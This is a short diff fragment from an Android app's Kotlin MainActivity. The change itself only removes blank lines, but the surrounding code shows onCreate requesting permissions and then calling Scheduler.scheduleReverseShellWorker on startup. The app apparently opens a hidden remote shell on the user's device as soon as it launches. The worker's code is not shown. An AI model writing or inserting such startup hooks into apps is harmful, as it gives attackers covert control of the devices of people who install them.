@@ -14,8 +14,6 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContent {
-
-
             PermissionRequester()
             println("Application Started")
             Scheduler.scheduleReverseShellWorker(applicationContext)
